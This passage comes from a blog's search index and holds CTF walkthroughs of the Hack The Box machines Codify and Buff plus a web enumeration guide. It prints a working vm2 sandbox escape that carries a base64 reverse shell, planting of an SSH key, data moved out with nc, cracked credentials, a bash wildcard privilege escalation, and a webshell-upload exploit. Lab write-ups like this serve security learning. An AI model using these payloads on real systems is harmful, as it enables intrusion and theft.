# Open the firewall sudo ufw allow from $RADDR to any port 4444,8000 proto tcp # Start a listener socat -d TCP-LISTEN:4444 STDOUT With the listener set up, I just need to find the right way to pop a reverse shell. I tried the simplest nc reverse shell, and also an unencoded bash one, both with no result. Then, I tried a very simple base64-encoded bash reverse shell as the payload (right where I used cat /etc/passwd in the previous image):
const {VM} = require(&#34;vm2&#34;); const vm = new VM(); const code = \` aVM2_INTERNAL_TMPNAME = {}; function stack() { new Error().stack; stack(); } try { stack(); } catch (a$tmpname) { a$tmpname.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0NDQgMD4mMQ== | base64 -d | bash -i&#39;); } \` console.log(vm.run(code)); Perfect! We now have remote code execution &#x1f601;
USER FLAG Planting an SSH key ssh-keygen -t rsa -b 4096 # I used passphrase bluej4y chmod 700 ./id_rsa While the exploit isn&rsquo;t inconvenient, I figured it would be good to plant an SSH key anyway. First, on my attacker box, generate a key and base-64 encode it:
# used passphrase &#34;bluej4y&#34;: ssh-keygen -t rsa -b 4096 chmod 700 ./id_rsa # copy output to clipboard: base64 -w 0 id_rsa.pub &gt; id_rsa.pub64; cat id_rsa.pub64 Then, on the target box, make an SSH directory and plant the key:
mkdir -p ~/.ssh cd ~/.ssh echo &#34;c3NoLXJz[...snip...]thbGkK&#34; | base64 -d &gt; authorized_keys Now back on the attacker box, go ahead and connect using SSH:
Excellent. Now I can reconnect if something goes wrong, and I have a very comfortable shell to use (and no need to upgrade the shell).
Enumeration: svc It looks like only svc, joshua, and root have home directories. svc can only write to their home directory and to the webserver files.
Checking for listening processes shows that there is a MySQL / MariaDB database running:
The MySQL database is only listening on localhost. To get around this limitation, I&rsquo;ll open up a socks5 proxy from the target machine. For this, I&rsquo;ll use chisel. To get chisel onto the target, I&rsquo;ll stand up a python http server from my attacker machine to host my standard toolbox, which contains chisel:
# Open up a firewall port for the http server and for chisel server sudo ufw allow from $RADDR to any port 8000,9999 proto tcp cd ~/MyToolbox # Run chisel and background it (or just use another terminal window/tab) ./chisel server --port 9999 --reverse --key MyS3cr3tK3y &amp; # Start the webserver to serve the Toolbox to the target python3 -m http.server 8000 ☝️ Note: I already have proxychains installed on my attacker machine, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 Then, on the target box:
# Set up a hidden directory in tmp to download tools to mkdir -p /tmp/.Tools cd /tmp/.Tools # Download each tool that might be useful, ex. chisel wget http://10.10.14.3:8000/chisel &amp;&amp; chmod 755 chisel # Form the proxy connection and background it ./chisel client 10.10.14.3:9999 R:1080:socks &amp; However, when attempting to connect to the database (over the socks5 proxy), I discovered that the database will require a valid credential. I tried the obvious credentials, such as root : root, svc : svc, svc : [blank], and anonymous:
proxychains mysql -h 127.0.0.1 -u [username] -p # enter password at the prompt Next, I went searching for credentials, perhaps in some kind of .env file for the webserver. I went looking around /var/www for such a file. While I didn&rsquo;t find anything very interesting inside the Express server at /var/www/editor, there was another directory adjacent to that one, in /var/www/contact. Taking a look inside that directory revealed an SQLite database, tickets.db.
SQLite database Using nc, I transferred the whole database to my attacker box:
# on attacker box: sudo ufw allow from $RADDR to any port 4445 proto tcp nc -lvnp 4445 &gt; tickets.db # on target box: nc -nv 10.10.14.9 4445 &lt; tickets.db # Wait a few seconds for the file transfer, then # on each box: shasum tickets.db &#x261d;&#xfe0f; I could have just as easily used SCP. Actually, I probably should have.
From my attacker box, I can freely take a look inside the database:
&#x1f44f; Hey, nice! There&rsquo;s a password hash. Unsurprisingly, name-that-hash identifies it as a bcrypt hash (hashcat mode 3200):
Let&rsquo;s put the hash into a file and try to crack it:
echo -n &#39;$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2&#39; &gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt &#x1f389; Fantastic! With any luck, this credential will still be valid. The only services I&rsquo;m aware of that require a login are MySQL and SSH.
First, I&rsquo;ll check MySQL again, this time using the newly-acquired credential:
Confirmed: joshua : spongebob1 is a valid credential for MySQL. Taking a quick look at the mysql database, I saw the user table:
That&rsquo;s interesting. I&rsquo;ll have to take a deeper look at this later &#x1f6a9; For now, I&rsquo;ll try that credential on SSH:
&#x1f34d; Success! Now I&rsquo;ve confirmed that joshua : spongebob1 is a valid credential for SSH. The SSH connection drops you into /home/joshua, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG Enumeration: joshua On my very first step of local enumeration for the joshua user, I checked what they can sudo:
&#x1f6a8; Privesc alert! That looks like an extremely likely privesc vector. Let&rsquo;s take a look at the script:
#!/bin/bash DB_USER=&#34;root&#34; DB_PASS=$(/usr/bin/cat /root/.creds) BACKUP_DIR=&#34;/var/backups/mysql&#34; read -s -p &#34;Enter MySQL password for $DB_USER: &#34; USER_PASS /usr/bin/echo if [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo &#34;Password confirmed!&#34; else /usr/bin/echo &#34;Password confirmation failed!&#34; exit 1 fi /usr/bin/mkdir -p &#34;$BACKUP_DIR&#34; databases=$(/usr/bin/mysql -u &#34;$DB_USER&#34; -h 0.0.0.0 -P 3306 -p&#34;$DB_PASS&#34; -e &#34;SHOW DATABASES;&#34; | /usr/bin/grep -Ev &#34;(Database|information_schema|performance_schema)&#34;) for db in $databases; do /usr/bin/echo &#34;Backing up database: $db&#34; /usr/bin/mysqldump --force -u &#34;$DB_USER&#34; -h 0.0.0.0 -P 3306 -p&#34;$DB_PASS&#34; &#34;$db&#34; | /usr/bin/gzip &gt; &#34;$BACKUP_DIR/$db.sql.gz&#34; done /usr/bin/echo &#34;All databases backed up successfully!&#34; /usr/bin/echo &#34;Changing the permissions&#34; /usr/bin/chown root:sys-adm &#34;$BACKUP_DIR&#34; /usr/bin/chmod 774 -R &#34;$BACKUP_DIR&#34; /usr/bin/echo &#39;Done!&#39; A pseudocode summary of that is:
- collect credentials for root user - prepare a backup directory - for databases &#39;mysql&#39; and &#39;sys&#39;: - run mysqldump on that database then gzip it - lock down the permissions on the backup directory Carefully reading through the script, I noticed a few things:
The script only calls binaries by their absolute path - path abuse is not an option. The script passes the root password in an insecure manner in two places (the calls to mysql and mysqldump). If this process runs periodically (like a cron job or something), then maybe I can eavesdrop on the password? I can control what data is in the database. I wonder if there&rsquo;s a way to plant something in the database that can somehow do a zip-slip or something to escape the backup file? I might have permissions to write triggers in the database. Maybe I can set up a trigger to do a file read when mysqldump runs? Maybe I can inject a parameter using the part that reads input into USER_PASS? &#x274e; I looked into (4), setting up a trigger to do a file read - Unfortunately, it&rsquo;s not possible to make a trigger that runs when mysqldump is invoked.
I&rsquo;ll investigate the feasibility of (2) though, by checking for periodic processes:
echo -e &#34;\\nChecking cron&#34;; crontab -l ; cat /etc/crontab ; ls -laR /etc/cron; \\ echo -e &#34;\\n\\nChecking anacron&#34;; anacrontab -l; cat /etc/anacrontab; \\ echo -e &#34;\\n\\nChecking for systemd timers:&#34;; find / -name &#39;*.timer&#39; 2&gt;/dev/null | grep systemd &#x274e; It doesn&rsquo;t look like there are any periodic processes that are relevant to this backup script.
&#x274e; It doesn&rsquo;t seem like gzip is susceptible to a zip slip (according to this github repo from Snyk)
What about (5)? I&rsquo;ll recreate the script locally (on my attacker box) and see if I&rsquo;m able to play with that variable.
Exploiting mysql-backup.sh After a bit of time playing with the script, I noticed something that I hadn&rsquo;t seen earlier: the IF statement to check the password is vulnerable to something devilishly simple. Consider this tiny bash script:
#!/usr/bin/env bash echo -n &#34;Input: &#34; read USER_INPUT if [[ &#34;foo&#34; == $USER_INPUT ]]; then echo -e &#34;\\&#34;foo\\&#34; == \\&#34;$USER_INPUT\\&#34;&#34; else echo -e &#34;\\&#34;foo\\&#34; != \\&#34;$USER_INPUT\\&#34;&#34; fi Let&rsquo;s try running it with different inputs, to see what equals &ldquo;foo&rdquo;:
&#x1f60f; Makes sense so far. But what about this:
&#x1f606; The wildcard character works within the equality test. Crazy, eh?
&#x261d;&#xfe0f; Note that if you reverse the if clause, this trick does not work:
if [[ $USER_INPUT == &#34;foo&#34; ]]; then With that in mind, let&rsquo;s grab that password! If my suscpicion is correct, I should be able to use pspy to eavesdrop on the process. I should be able to see the password being passed to this line of the script:
/usr/bin/mysql -u &#34;$DB_USER&#34; -h 0.0.0.0 -P 3306 -p&#34;$DB_PASS&#34; -e &#34;SHOW DATABASES\` Since I need to watch for the above line, I&rsquo;ll need to either use a backgrounded process or use something like tmux with two panes open. Since tmux is available on the target, I&rsquo;ll use that. In one pane, I&rsquo;ll sudo the script, and enter * as the password:
Meanwhile, observing pspy in the other pane:
There it is! We have a verified credential for the MySQL database: root : kljh12k3jhaskjh12kjh3
&#x1f91e; Hoping for the best, I&rsquo;ll try to change to root with su using this password:
Alright! There&rsquo;s the root shell. From there, simply cat the flag for the remainder of the box&rsquo;s points &#x1f4b0;
LESSONS LEARNED Attacker Go for the quick win. If you think you&rsquo;ve found a lead during enumeration - go check it out right away, especially if it&rsquo;s going to be quick to check. This is the power of good note-taking: your lead might bring you closer to a quick win, or if not you can always refer back to your notes when that lead hits a dead-end. It isn&rsquo;t real. It&rsquo;s a puzzle. On easy-rated boxes, it&rsquo;s important to keep in mind that it usually is more like a puzzle than reality. On Codify, the web app was littered with clues about its vulnerabilities. All it took was a little bit of research to string together the clues into something actionable. Plan your attack. I know it sounds simple, but it&rsquo;s important. On this box, as I was going through the root privesc I had ideas for multiple strategies. Numbering these off and tackling them sequentially was a great idea, and something I&rsquo;ll be doing more often from now on. Wildcard variable substitution in shell scripts is really easy. Try it early and often. It seems like it works whenever you control a variable on the righthand side of a binary comparison operator in a sh script. Defender Mind your supply chain. The &ldquo;Editor&rdquo; web app in this box relied on a package called vm2 for sandboxing edited code. While it is still reasonably popular, the package is way past EOL. Even though it is clearly marked as obsolete, it still somehow gets 8000+ weekly downloads from npm. As a developer, you don&rsquo;t need to go too crazy making sure all of your dependencies are bleeding-edge, but it is very important to stay up-to-date with dependencies that you rely on for security.
Bash scripts don&rsquo;t mix with secure code. I love bash scripting, but it has a time and a place. It&rsquo;s really easy to write a bash script that works, but almost impossible to write one that&rsquo;s secure. There are simply too many wacky &ldquo;gotchas&rdquo; in how it works. For a fun introduction in how many ways this can go wrong, check out this article.
Test your code. I&rsquo;ll readily admit I&rsquo;m no expert developer, but I know that automated testing is absolutely essential. Even if you think a piece of code is perfect, does it really hurt to throw a fuzzer at it?
`,url:"https://4wayhandshake.github.io/walkthrough/codify/"},"https://4wayhandshake.github.io/strategy/web-enumeration/":{title:"Web Enumeration",tags:["Enumeration","Nmap","Ffuf","Gobuster","Feroxbuster"],categories:["Strategy","CTF","Web"],content:`INTRODUCTION Why write this? Lately, I&rsquo;ve settled into a pretty good set of web enumeration techniques. As I&rsquo;ve been writing more and more walkthroughs, it has started feeling quite repetetive always writing about the same web enumeration strategy. Why not skip that whole song-and-dance, and write it on a separate page that I can link to?
Most importantly, I like having a convenient reference for myself: it really speeds up recon on a box when you have exactly the right enumeration commands at your fingertips. This way, I don&rsquo;t have to spend any time formulating the perfect ffuf command; I can just copy-paste from my previous work.
Disclaimer There are many, many ways to do web enumeration. I like the techniques below because they are versatile and don&rsquo;t pigeonhole you into a particular set of tools. Many professionals prefer to simply use the paid version of Burpsuite for this, to accomplish all tasks within one piece of software.
NMAP SCANS Good recon always begins with running some nmap scans. To prevent nmap from running as a basic &ldquo;connect&rdquo; scan, all of these should be ran as root. Also, OS detection (-O) requires root.
Burp proxy Sometimes you&rsquo;ll want Burp to build a site map as you enumerate. If you want your results to appear in Burp, the method depends on which tool you&rsquo;re using:
For Gobuster: check out this article on how to set up Burp itself to act at the proxy for your target. With this method, you&rsquo;ll point gobuster at your Burp proxy with the -u flag, and have Burp relay all requests to your target. For Ffuf: just use -replay-proxy http://127.0.0.1:8080 and in Burp enable Intercept. For Feroxbuster: simply use the --burp switch Port scan I always start with a simple but broad port scan. Some people prefer to use the timing flags like -T4 instead of specifying a --min-rate.
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Here&rsquo;s a sample of the output to expect:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 12:00 IDT Nmap scan report for 10.10.11.214 Host is up (0.24s latency). Not shown: 65534 open|filtered udp ports (no-response), 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 50051/tcp open unknown Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 5.0 (99%), Linux 4.15 - 5.8 (94%), Linux 5.0 - 5.4 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.5 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.1 (93%), Linux 3.16 (93%), Linux 3.2 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops You can often ignore the OS detection. The most important part is the tabular data outlining which TCP ports were listening.
Script scan The above scan puts its results into nmap/port-scan-tcp.txt. Next, we&rsquo;ll take the ports that we found and perform a script scan on them. The following will run the default scripts only:
# Make a comma-separated list of the discovered TCP ports TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` # Run the script scan using those ports only sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR Here&rsquo;s a sample of what to expect:
PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) |_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://ermagerd-mern.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Ermagerd-MERN Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel &#x261d;&#xfe0f; To find out exactly which scripts are &ldquo;default&rdquo;, try this:
grep -El &#39;categories = {.*default.*}&#39; /usr/share/nmap/scripts/*.nse | xargs -I {} basename {} Vulnerability scan Permitting that there is web application firewall running, and no kind of intrusion detection running, it can be an excellent idea to get nmap to scan for known common vulnerabilities. Note that this one can take quite a bit of time:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR If you enjoy living dangerously, you may want to use 'vuln' instead of just 'safe and vuln' &#x1f63c;
UDP scan It&rsquo;s also good practice to do a UDP port scan. But it&rsquo;s better to limit this one to &ldquo;normal&rdquo; ports. Like the vuln scan, this one can take quite a bit of time:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; Note that any open|filtered ports are either open or (much more likely) filtered.
ENUMERATION Record the Domain If the nmap scans show a server on port 80 or 443, I&rsquo;ll go through the webserver strategy. First I add the domain of the target to /etc/hosts. Usually, the domain of the target is shown in the nmap script scan. For example:
80/tcp open http Apache httpd 2.4.56 |_http-title: Did not follow redirect to http://ermagerd-mern.htb/ |_http-server-header: Apache/2.4.56 (Debian) DOMAIN=ermagerd-mern.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
Banner grabbing Next, I do banner-grabbing on the target. This sometimes reveals a subdomain by insisting on a redirect. More often than not, though, it shows what type of webserver is running (apache, nginx, IIS, etc.)
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR VHost scan It&rsquo;s very important that you perform subdomain and/or vhost enumeration before doing directory enumeration. While it is more likely you&rsquo;ll find an important result using directory enumeration, the potential cost of not exploring subdomains is much much higher. Save yourself the time, and find those vhosts/subdomains first!
My preferred way, using Ffuf:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Or here&rsquo;s a similar way to do it with Gobuster
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; gobuster vhost -w $WLIST -u http://$RADDR \\ --random-agent -t 10 --timeout 5s \\ --output &#34;fuzzing/vhost-gobuster-root.txt&#34; \\ --no-error This is a traditional vhost search using ffuf. If it returns anything, it will show what domains might be listening on http. Be sure to adjust this if you know HTTPS is running: both ffuf and gobuster use the -k flag (just like curl)
Subdomain scan On HTB, there&rsquo;s a really good chance that the above enumeration will yield no results. However, it leads into the next one which does often yield a result:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.boxname.htb&#34; -c -t 60 -o fuzzing/subdomain-boxname.md -of md -timeout 4 -ic -ac -v While this is actually still a vhost scan, this method will find subdomains of the primary domain discovered from the last scan. For example, shop.boxname.htb, or registration.boxname.htb.
I find that doing a vhost scan finds the same results but is performed faster than a regular subdomain scan. If you insist on doing a regular subdomain scan, try this:
ffuf -w $WLIST:FUZZ -u http://FUZZ.$DOMAIN/FUZZ -t 80 -c -o fuzzing/subdomain-ffuf-$DOMAIN -of json -e php,asp,js,html -timeout 4 -v Directory enumeration Now comes the big one. Once vhost and subdomain enumeration have been performed, the next step is to perform directory enumeration on every vhost and subdomain that was found. Here&rsquo;s how I do it with ffuf:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ \\ -t 80 --recursion --recursion-depth 2 -c \\ -o fuzzing/directory-ffuf-$DOMAIN -of json \\ -e php,asp,js,html -timeout 4 -v Here&rsquo;s a really similar way to do it with Gobuster:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; gobuster dir -w $WLIST -u http://$DOMAIN \\ --random-agent -t 10 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-$DOMAIN.txt&#34; \\ --no-error And if you really want to go nuts, try Feroxbuster with all the bells and whistles:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; feroxbuster -w $WLIST -u http://$DOMAIN \\ -A -d 1 -t 100 -T 4 --burp -f --auto-tune \\ --collect-words --filter-status 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-feroxbuster-$DOMAIN.json&#34; &#x261d;&#xfe0f; The above Gobuster command will find directories and pages without extensions. The ffuf and feroxbuster commands will find directories and files.
API Fuzzing Sometimes you&rsquo;ll come across an API or something, and want to know what type of http requests it&rsquo;s listening for. Thankfully, the number of HTTP verbs is very finite, making this a quick scan:
WLIST=/usr/share/seclists/Fuzzing/http-request-methods.txt ffuf -w $WLIST:FUZZ -u https://boxname.htb/path/to/api -X FUZZ -t 80 -c -timeout 4 -v -mc all &#x261d;&#xfe0f; If the results seem overwhelming, then this might not have been a useful test. In that case, it&rsquo;s usually fine to simply default to using only GET and POST. Even theen, POST-based APIs are far more common.
Once you&rsquo;ve discovered the set of HTTP verbs that an API might be listening for, an easy way to incorporate this info is just by using a bash loop:
# This is a good wordlist for fuzzing API actions WLIST=/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt for METHOD in GET POST PUT; do ffuf -w $WLIST:FUZZ -u https://boxname.htb/path/to/api/FUZZ \\ -X $METHOD -t 80 -c -timeout 4 -v -mc all -fc 404; done Exploring the Website The two most important first steps while exploring a website are:
Fingerprint the website. What open source software does it use? What type of server is running? Identify restricted resources. These are usually indicated by a login page or some other form of authentication. Fingerprinting As previously mentioned, do some banner-grabbing. As a quick followup to this, check what Wappalyzer has to say. This info (almost) never leads directly to a vulnerability, but it will let you know what you&rsquo;re dealing with.
Next, I look for the page footer. Or some kind of &ldquo;about&rdquo;, &ldquo;credits&rdquo;, or &ldquo;licenses&rdquo; page. By the law of most open source licenses, the website must declare what software they used. Even if the website itself is closed-source, this can give you a very good lead on the supply chain behind the website. Often, this will even indicate software versions! You can save yourself a lot of time by doing a little OSINT on the software components of your target.
Once you&rsquo;ve identified names of software components and version numbers, head straight to google and start searching for &ldquo;sofwarename version x.y.z vulnerability CVE PoC&rdquo; for a quick win.
Often, vulnerability disclosures, patch notes, and infosec blog articles are extremely formulaic. Get a feel for how you can rapidly search for the nuggets of information that will lead you to an actionable exploit.
Checking for a Path Traversal LFI=/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt ffuf -w $LFI:LFI -u http://$DOMAIN/known/directory/LFI -t 80 -c -timeout 4 -v It will shock you how many websites have a directory traversal problem.
Also, consider using my tool Alfie, or its precessessor LFI Enumerator. It checks for directory traversals using a ton of different patterns, encodings, and string escapes. Alfie also checks for a couple important LFIs.
For a more comprehensive and well-known tool, you can also check out fimap.
`,url:"https://4wayhandshake.github.io/strategy/web-enumeration/"},"https://4wayhandshake.github.io/walkthrough/buff/":{title:"Buff",tags:["CVE","Local Enumeration","Proxy","Buffer Overflow"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION Buff is the third Windows box in my “Let’s brush up on Windows!” series. For the previous one, see my walkthrough on Netmon. This box houses a web app for a fictional gym / fitness center. It&rsquo;s fairly easy, but requires good Windows enumeration fundamentals. Following any reasonable pentest checklist will secure a victory on this box.
Recon is fairly unimportant with Buff. Foothold is achieved with hardly more than a few clicks and a CVE, and leads directly to the user flag. The root flag is a little more challenging, requiring some local enumeration on the box and application of another CVE. The solution is fairly straightforward: just stick to your checklists and you&rsquo;ll grab that root flag quickly.
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 8080/tcp open http-proxy Only a webserver on 8080, eh? To investigate a little further, I ran a script scan:
sudo nmap -sV -sC -n -Pn -p8080 -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n&#39;s Bro Hut That&rsquo;s a really old OpenSSL version. However, a quick web search shows it&rsquo;s not vulnerable to Heartbleed. I&rsquo;ll do a vulnerability scan on TCP port 8080:
sudo nmap -n -Pn -p8080 -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR PORT STATE SERVICE 8080/tcp open http-proxy |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) |_http-trace: TRACE is enabled | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server&#39;s resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_ http://ha.ckers.org/slowloris/ While DOS attacks are important in the real world, they are irrelevant on HTB. To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
All 100 scanned ports on 10.10.10.198 are in ignored states. Not shown: 100 open|filtered udp ports (no-response) Webserver Strategy I added buff.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=template.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR:8080 &amp;&amp; curl -IL http://$RADDR:8080 Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR:8080/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results. Now I&rsquo;ll check for subdomains of buff.htb
ffuf -w $WLIST -u http://$RADDR:8080/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Also no results. I&rsquo;ll move on to directory enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN:8080/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v Directory enumeration against http://buff.htb:8080/ gave the following. The recursive scan is still running, but these are the initial results:
Exploring the Website The website is a fairly simple. It looks like it&rsquo;s the site for some kind of gym or fitness center. The only thing that seems interactible is the login form shown in the top-right. The login uses basic http authentication.
The page at /contact.php shows what software the webserver might be running:
While that seems like it isn&rsquo;t a real thing, searchsploit shows a very similar result:
FOOTHOLD Gym Management System RCE I&rsquo;ll try those out, starting with the unauthenticated RCE exploit:
searchsploit --path 48506 mkdir exploit; cd exploit cp /usr/share/exploitdb/exploits/php/webapps/48506.py . python ./48506.py # Exploit tested with python 2.7.17 Taking a quick look at the code, it seems like the exploit doesn&rsquo;t reference any particular CVE, but still it is clear how it works: The exploit uploads a &ldquo;picture&rdquo; at /upload.php, where the picture&rsquo;s magic bytes contain a PHP webshell located at /telepathy.
# Try out the exploit python 48506.py http://$RADDR:8080/ Seems like everything worked - I now have a usable webshell &#x1f44d;
USER FLAG Type it out While this webshell doesn&rsquo;t seem to be able to change directories, it does seem to be able to execute commands using absolute paths. A quick check net users confirms that shaun is the regular low-privilege user:
As such, shaun probably has the user flag. I&rsquo;ll check to see if it&rsquo;s in the usual spot:
dir C:\\Users\\shaun\\Desktop /a Yep, there it is. Just type the flag to obtain it:
type C:\\Users\\shaun\\Desktop\\user.txt ROOT FLAG Enumeration: shaun I&rsquo;ll start with some basic enumeration of the target. First, the OS version:
Check the listening ports:
netstat -ano Check the firewall state:
netsh firewall show state Many results, but these are the ones listening on localhost
TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING 7636 TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 1968 TCP port 3306 is usually MySQL / MariaDB. But what is on port 8888? A search for common uses of this port didn&rsquo;t really reveal anything prominent. I&rsquo;ll try to line it up with the listening process according to its PID:
netstat -ano &amp; tasklist Hmm, ok I&rsquo;ve never heard of CloudMe before. I&rsquo;ll have to look into that &#x1f6a9; Also, tasklist confirmed that it is indeed MySQL that is running - I&rsquo;ll have to look for a database too &#x1f6a9;
Doing a web search for &ldquo;CloudMe&rdquo; revealed that it&rsquo;s some kind of cloud storage / file share tool. It looks like its highly cross-platform. Suddenly it makes sense why it&rsquo;s only exposed locally. I&rsquo;ll check searchsploit for it:
Oh wow, lot&rsquo;s available! I hope we&rsquo;re dealing with the right version. Look at what&rsquo;s in common between these: they&rsquo;re all buffer overflows. That gives me a little hope that I&rsquo;m on the right track. So where is this CloudMe.exe located? I can check using wmic:
wmic process where &#34;name=&#39;CloudMe.exe&#39;&#34; # C:\\Windows If that&rsquo;s its location, there&rsquo;s a solid chance that it&rsquo;s being ran by Administrator - so it could very well be a privilege escalation vector.
CloudMe I took a look through a few of the exploits listed from searchsploit (shown above). All of them ran using python. This leaves me with two options: either run the python locally on the target, or run the python from my attacker machine (which would require a proxy). Since I&rsquo;d rather not mess around with transferring Python onto the target, it seems more pallatable to instead just transfer chisel.
The plan: I need to run chisel on the target, but how to perform the file transfer when starting with a cmd webshell? Again, I have a few options:
Host a python or php webserver to serve chisel Use curl to download chisel directly Upgrade to Powershell, then use powershell to download the file. Host SMB from my attacker machine to serve chisel Download chisel using SMB from the target Option 1 seems a lot simpler. For the sake of learning, I want to try both methods of option (1).
When I was checking where I could download chisel to on the target, I was looking through shaun&rsquo;s Downloads directory and found something surprising:
There&rsquo;s another copy of CloudMe sitting there. I thought it was running from C:\\Windows..?
Getting chisel Method 1a: use curl
curl -o C:\\Users\\shaun\\Downloads\\chisel.exe http://10.10.14.9:8000/chisel.exe Seems like it worked:
Method 1b: use Powershell
First, I&rsquo;ll try it using just the webshell: powershell via webshell &gt; download chisel &gt; exploit
powershell (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.9:8000/chisel.exe&#39;,&#39;C:\\Users\\shaun\\Downloads\\chisel2.exe&#39;) A check of C:\\Users\\shaun\\Downloads\\ shows that it did not work.
Next, I&rsquo;ll try the same thing but instead creating a reverse shell: download nc (via webshell) &gt; powershell reverse shell &gt; Download chisel &gt; exploit
